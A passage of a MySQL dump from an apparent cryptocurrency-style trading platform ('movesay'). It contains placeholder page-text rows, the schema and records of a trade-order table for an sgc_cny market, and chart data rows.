INSERT INTO `movesay_text` VALUES ('21', 'user_alipay', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464677631', '0', '0');
INSERT INTO `movesay_text` VALUES ('22', 'user_tpwdset', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464677866', '0', '0');
INSERT INTO `movesay_text` VALUES ('23', 'user_goods', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464677872', '0', '0');
INSERT INTO `movesay_text` VALUES ('24', 'finance_index', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678956', '0', '0');
INSERT INTO `movesay_text` VALUES ('25', 'finance_mytx', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678959', '0', '0');
INSERT INTO `movesay_text` VALUES ('26', 'finance_myzr', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678960', '0', '0');
INSERT INTO `movesay_text` VALUES ('27', 'finance_myzc', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678961', '0', '0');
INSERT INTO `movesay_text` VALUES ('28', 'finance_mywt', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678962', '0', '0');
INSERT INTO `movesay_text` VALUES ('29', 'finance_mycj', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678963', '0', '0');
INSERT INTO `movesay_text` VALUES ('30', 'finance_mytj', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678964', '0', '0');
INSERT INTO `movesay_text` VALUES ('31', 'finance_mywd', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678966', '0', '0');
INSERT INTO `movesay_text` VALUES ('32', 'finance_myjp', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678967', '0', '0');
INSERT INTO `movesay_text` VALUES ('33', 'game_shop_goods', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695180', '0', '0');
INSERT INTO `movesay_text` VALUES ('34', 'game_issue', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695216', '0', '0');
INSERT INTO `movesay_text` VALUES ('35', 'game_issue_log', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695219', '0', '0');
INSERT INTO `movesay_text` VALUES ('36', 'game_fenhong', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695289', '0', '0');
INSERT INTO `movesay_text` VALUES ('37', 'game_fenhong_log', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695290', '0', '0');
INSERT INTO `movesay_text` VALUES ('38', 'game_shop', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695294', '0', '0');
INSERT INTO `movesay_text` VALUES ('39', 'game_shop_log', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695669', '0', '0');
INSERT INTO `movesay_text` VALUES ('40', 'game_shop_view', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464710521', '0', '0');
INSERT INTO `movesay_text` VALUES ('41', 'game_issue_buy', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464762288', '0', '0');
INSERT INTO `movesay_text` VALUES ('42', 'game_vote', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464856754', '0', '0');
INSERT INTO `movesay_text` VALUES ('43', 'game_huafei', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1466398472', '0', '0');
INSERT INTO `movesay_text` VALUES ('44', 'game_money', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1467371753', '0', '0');
INSERT INTO `movesay_text` VALUES ('45', 'game_money_log', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:&quot;Microsoft Yahei&quot;, &quot;Sim sun&quot;, tahoma, &quot;Helvetica,Neue&quot;, Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1467371757', '0', '0');

-- ----------------------------
-- Table structure for movesay_trade
-- ----------------------------
DROP TABLE IF EXISTS `movesay_trade`;
CREATE TABLE `movesay_trade` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `market` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `deal` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` decimal(20,8) unsigned NOT NULL,
  `type` tinyint(2) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(2) NOT NULL,
  `buyuserid` int(11) DEFAULT NULL,
  `buyid` int(11) DEFAULT NULL,
  `status1` tinyint(2) DEFAULT NULL,
  `imgurl` varchar(300) DEFAULT NULL,
  `paytime` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `market` (`market`,`type`,`status`),
  KEY `num` (`num`,`deal`),
  KEY `status` (`status`),
  KEY `market_2` (`market`)
) ENGINE=MyISAM AUTO_INCREMENT=432404 DEFAULT CHARSET=utf8 COMMENT='交易下单表';

-- ----------------------------
-- Records of movesay_trade
-- ----------------------------
INSERT INTO `movesay_trade` VALUES ('432356', '4944', 'sgc_cny', '7.00000000', '5000.00000000', '5000.00000000', '35000.00000000', '250.00000000', '2', '0', '1505457614', '0', '1', '4966', '432358', '2', '/Upload/trade/59bb963b4e34f.jpg', '1505465926');
INSERT INTO `movesay_trade` VALUES ('432357', '4947', 'sgc_cny', '7.00000000', '10000.00000000', '0.00000000', '70000.00000000', '500.00000000', '2', '0', '1505459533', '0', '0', '5074', '432389', '1', '/Upload/trade/59c468f91eed3.jpg', null);
INSERT INTO `movesay_trade` VALUES ('432358', '4966', 'sgc_cny', '7.00000000', '5000.00000000', '5000.00000000', '35000.00000000', '0.00000000', '1', '0', '1505465201', '0', '1', '4944', '432356', '2', '/Upload/trade/59bb963b4e34f.jpg', '1505465926');
INSERT INTO `movesay_trade` VALUES ('432359', '4966', 'sgc_cny', '7.00000000', '10000.00000000', '0.00000000', '70000.00000000', '0.00000000', '1', '0', '1505465696', '0', '2', '4947', '432357', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432362', '4982', 'sgc_cny', '7.00000000', '10000.00000000', '0.00000000', '70000.00000000', '0.00000000', '1', '0', '1505476876', '0', '2', '4947', '432357', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432360', '4944', 'sgc_cny', '7.00000000', '100.00000000', '0.00000000', '700.00000000', '5.00000000', '2', '0', '1505470664', '0', '2', null, null, null, null, null);
INSERT INTO `movesay_trade` VALUES ('432361', '4944', 'sgc_cny', '7.00000000', '10000.00000000', '10000.00000000', '70000.00000000', '500.00000000', '2', '0', '1505471694', '0', '1', '5022', '432364', '2', '/Upload/trade/59c08b845b2ff.jpg', '1505790533');
INSERT INTO `movesay_trade` VALUES ('432363', '5025', 'sgc_cny', '7.00000000', '10000.00000000', '0.00000000', '70000.00000000', '0.00000000', '1', '0', '1505483586', '0', '2', '4944', '432361', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432364', '5022', 'sgc_cny', '7.00000000', '10000.00000000', '10000.00000000', '70000.00000000', '0.00000000', '1', '0', '1505790506', '0', '1', '4944', '432361', '2', '/Upload/trade/59c08b845b2ff.jpg', '1505790533');
INSERT INTO `movesay_trade` VALUES ('432365', '5041', 'sgc_cny', '7.00000000', '10000.00000000', '0.00000000', '70000.00000000', '0.00000000', '1', '0', '1506044049', '0', '2', '4947', '432357', '1', '/Upload/trade/59c468f91eed3.jpg', null);
INSERT INTO `movesay_trade` VALUES ('432368', '5045', 'sgc_cny', '1.00000000', '1.00000000', '1.00000000', '1.00000000', '0.00000000', '1', '0', '1506321275', '0', '1', '5043', '432367', '2', '/Upload/trade/59c8a3a09efcd.jpg', '1506321302');
INSERT INTO `movesay_trade` VALUES ('432366', '5043', 'sgc_cny', '1.00000000', '1.00000000', '0.00000000', '1.00000000', '0.05000000', '2', '0', '1506054207', '0', '2', null, null, null, null, null);
INSERT INTO `movesay_trade` VALUES ('432367', '5043', 'sgc_cny', '1.00000000', '1.00000000', '1.00000000', '1.00000000', '0.05000000', '2', '0', '1506054311', '0', '1', '5045', '432368', '2', '/Upload/trade/59c8a3a09efcd.jpg', '1506321302');
INSERT INTO `movesay_trade` VALUES ('432369', '5045', 'sgc_cny', '10.00000000', '1000.00000000', '0.00000000', '10000.00000000', '50.00000000', '2', '0', '1506321503', '0', '0', '5048', '432372', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432370', '5048', 'sgc_cny', '7.00000000', '10000.00000000', '0.00000000', '70000.00000000', '0.00000000', '1', '0', '1506394826', '0', '2', '4947', '432357', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432371', '5048', 'sgc_cny', '10.00000000', '100.00000000', '0.00000000', '1000.00000000', '5.00000000', '2', '0', '1506397741', '0', '0', '5051', '432375', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432372', '5048', 'sgc_cny', '10.00000000', '1000.00000000', '0.00000000', '10000.00000000', '0.00000000', '1', '0', '1506398878', '0', '1', '5045', '432369', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432373', '5050', 'sgc_cny', '1.00000000', '1000.00000000', '1000.00000000', '1000.00000000', '50.00000000', '2', '0', '1506474535', '0', '1', '5051', '432374', '2', '/Upload/trade/59cb12c48c809.png', '1506480856');
INSERT INTO `movesay_trade` VALUES ('432374', '5051', 'sgc_cny', '1.00000000', '1000.00000000', '1000.00000000', '1000.00000000', '0.00000000', '1', '0', '1506480801', '0', '1', '5050', '432373', '2', '/Upload/trade/59cb12c48c809.png', '1506480856');
INSERT INTO `movesay_trade` VALUES ('432375', '5051', 'sgc_cny', '10.00000000', '100.00000000', '0.00000000', '1000.00000000', '0.00000000', '1', '0', '1506480935', '0', '1', '5048', '432371', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432376', '5051', 'sgc_cny', '1.00000000', '2.00000000', '0.00000000', '2.00000000', '0.10000000', '2', '0', '1506511135', '0', '0', '5052', '432377', '1', '/Upload/trade/59cb8ac7b6e68.png', null);
INSERT INTO `movesay_trade` VALUES ('432377', '5052', 'sgc_cny', '1.00000000', '2.00000000', '0.00000000', '2.00000000', '0.00000000', '1', '0', '1506511521', '0', '1', '5051', '432376', '1', '/Upload/trade/59cb8ac7b6e68.png', null);
INSERT INTO `movesay_trade` VALUES ('432378', '5050', 'sgc_cny', '1.00000000', '1000.00000000', '0.00000000', '1000.00000000', '50.00000000', '2', '0', '1506565648', '0', '0', '5075', '432388', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432379', '5048', 'sgc_cny', '1.00000000', '1000.00000000', '0.00000000', '1000.00000000', '0.00000000', '1', '0', '1506565703', '0', '2', '5050', '432378', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432380', '5048', 'sgc_cny', '1.00000000', '10.00000000', '0.00000000', '9.00000000', '1.00000000', '2', '0', '1506567728', '0', '0', '5067', '432386', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432381', '5048', 'sgc_cny', '1.00000000', '2.00000000', '0.00000000', '1.00000000', '1.00000000', '2', '0', '1506583929', '0', '2', null, null, null, null, null);
INSERT INTO `movesay_trade` VALUES ('432382', '5048', 'sgc_cny', '1.00000000', '1000.00000000', '0.00000000', '950.00000000', '50.00000000', '2', '0', '1506583953', '0', '0', '5105', '432401', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432383', '5048', 'sgc_cny', '7.00000000', '10000.00000000', '0.00000000', '70000.00000000', '0.00000000', '1', '0', '1506583971', '0', '2', '4947', '432357', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432384', '5050', 'sgc_cny', '1.00000000', '10.00000000', '0.00000000', '10.00000000', '0.00000000', '1', '0', '1506584177', '0', '2', '5048', '432380', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432385', '5050', 'sgc_cny', '1.00000000', '2.00000000', '0.00000000', '2.00000000', '0.00000000', '1', '0', '1506584794', '0', '2', '5048', '432381', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432386', '5067', 'sgc_cny', '1.00000000', '10.00000000', '0.00000000', '10.00000000', '0.00000000', '1', '0', '1513097908', '0', '0', '5048', '432380', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432387', '5069', 'sgc_cny', '1.00000000', '1000.00000000', '0.00000000', '1000.00000000', '0.00000000', '1', '0', '1513425917', '0', '2', '5050', '432378', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432388', '5075', 'sgc_cny', '1.00000000', '1000.00000000', '0.00000000', '1000.00000000', '0.00000000', '1', '0', '1513665182', '0', '0', '5050', '432378', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432389', '5074', 'sgc_cny', '7.00000000', '10000.00000000', '0.00000000', '70000.00000000', '0.00000000', '1', '0', '1513665677', '0', '0', '4947', '432357', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432390', '5077', 'sgc_cny', '1.00000000', '1000.00000000', '0.00000000', '1000.00000000', '0.00000000', '1', '0', '1513850508', '0', '2', '5048', '432382', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432400', '5105', 'sgc_cny', '1.01000000', '100.00000000', '0.00000000', '101.00000000', '5.00000000', '2', '0', '1516953887', '0', '0', '5058', '432402', '2', null, '1517282588');
INSERT INTO `movesay_trade` VALUES ('432399', '5058', 'sgc_cny', '1.00000000', '1.00000000', '0.00000000', '1.00000000', '0.00000000', '1', '0', '1516781785', '0', '0', '5048', '432397', '2', null, '1521709126');
INSERT INTO `movesay_trade` VALUES ('432391', '5048', 'sgc_cny', '1.00000000', '10.00000000', '10.00000000', '10.00000000', '0.50000000', '2', '0', '1514876936', '0', '1', '5058', '432392', '2', null, '1514877314');
INSERT INTO `movesay_trade` VALUES ('432392', '5058', 'sgc_cny', '1.00000000', '10.00000000', '10.00000000', '10.00000000', '0.00000000', '1', '0', '1514877089', '0', '1', '5048', '432391', '2', null, '1514877314');
INSERT INTO `movesay_trade` VALUES ('432393', '5048', 'sgc_cny', '2.00000000', '1.00000000', '1.00000000', '2.00000000', '0.05000000', '2', '0', '1514878584', '0', '1', '5058', '432394', '2', null, '1514878803');
INSERT INTO `movesay_trade` VALUES ('432394', '5058', 'sgc_cny', '2.00000000', '1.00000000', '1.00000000', '2.00000000', '0.00000000', '1', '0', '1514878762', '0', '1', '5048', '432393', '2', null, '1514878803');
INSERT INTO `movesay_trade` VALUES ('432395', '5048', 'sgc_cny', '1.00000000', '10.00000000', '10.00000000', '10.00000000', '0.50000000', '2', '0', '1514880991', '0', '1', '5095', '432396', '2', null, '1515489015');
INSERT INTO `movesay_trade` VALUES ('432396', '5095', 'sgc_cny', '1.00000000', '10.00000000', '10.00000000', '10.00000000', '0.00000000', '1', '0', '1515411833', '0', '1', '5048', '432395', '2', null, '1515489015');
INSERT INTO `movesay_trade` VALUES ('432397', '5048', 'sgc_cny', '1.00000000', '1.00000000', '0.00000000', '1.00000000', '0.05000000', '2', '0', '1515489993', '0', '0', '5058', '432399', '2', null, '1521709126');
INSERT INTO `movesay_trade` VALUES ('432398', '5100', 'sgc_cny', '1.00000000', '1.00000000', '0.00000000', '1.00000000', '0.00000000', '1', '0', '1516520350', '0', '2', '5048', '432397', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432401', '5105', 'sgc_cny', '1.00000000', '1000.00000000', '0.00000000', '1000.00000000', '0.00000000', '1', '0', '1516953941', '0', '0', '5048', '432382', '1', null, null);
INSERT INTO `movesay_trade` VALUES ('432402', '5058', 'sgc_cny', '1.01000000', '100.00000000', '0.00000000', '101.00000000', '0.00000000', '1', '0', '1517214232', '0', '0', '5105', '432400', '2', null, '1517282588');
INSERT INTO `movesay_trade` VALUES ('432403', '5141', 'sgc_cny', '1.01000000', '100.00000000', '0.00000000', '101.00000000', '0.00000000', '1', '0', '1517214232', '0', '0', '5105', '432400', '2', '', '1517282588');

-- ----------------------------
-- Table structure for movesay_trade_json
-- ----------------------------
DROP TABLE IF EXISTS `movesay_trade_json`;
CREATE TABLE `movesay_trade_json` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `market` varchar(100) NOT NULL,
  `data` varchar(500) NOT NULL,
  `type` varchar(100) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `market` (`market`)
) ENGINE=MyISAM AUTO_INCREMENT=751683 DEFAULT CHARSET=utf8 COMMENT='交易图表表';

-- ----------------------------
-- Records of movesay_trade_json
-- ----------------------------
INSERT INTO `movesay_trade_json` VALUES ('720242', 'sgc_cny', '[1505466386,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '1', '0', '1505466386', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720244', 'sgc_cny', '[1505466360,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '3', '0', '1505466360', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720245', 'sgc_cny', '[1505466300,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '5', '0', '1505466300', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720246', 'sgc_cny', '[1505466000,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '10', '0', '1505466000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720247', 'sgc_cny', '[1505466000,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '15', '0', '1505466000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720248', 'sgc_cny', '[1505466000,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '30', '0', '1505466000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720249', 'sgc_cny', '[1505466000,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '60', '0', '1505466000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720250', 'sgc_cny', '[1505466000,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '120', '0', '1505466000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720251', 'sgc_cny', '[1505466000,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '240', '0', '1505466000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720252', 'sgc_cny', '[1505466000,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '360', '0', '1505466000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720253', 'sgc_cny', '[1505466000,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '720', '0', '1505466000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720254', 'sgc_cny', '[1505466000,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '1440', '0', '1505466000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720255', 'sgc_cny', '[1505466000,\"5000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '10080', '0', '1505466000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720501', 'sgc_cny', '[1506157200,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '1440', '0', '1506157200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720287', 'sgc_cny', '[1506070800,\"11001.00000000\",\"7.00000000\",\"7.00000000\",\"1.00000000\",\"1.00000000\"]', '10080', '0', '1506070800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720499', 'sgc_cny', '[1506157200,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '720', '0', '1506157200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720702', 'sgc_cny', '[1506157200,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '360', '0', '1506157200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('720878', 'sgc_cny', '[1506157200,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '240', '0', '1506157200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('721209', 'sgc_cny', '[1506157200,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '120', '0', '1506157200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('721935', 'sgc_cny', '[1506157200,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '60', '0', '1506157200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('723179', 'sgc_cny', '[1506157200,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '30', '0', '1506157200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('725164', 'sgc_cny', '[1506158100,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '15', '0', '1506158100', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('726760', 'sgc_cny', '[1506158400,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '10', '0', '1506158400', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('730409', 'sgc_cny', '[1506158700,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '5', '0', '1506158700', '0', '0');
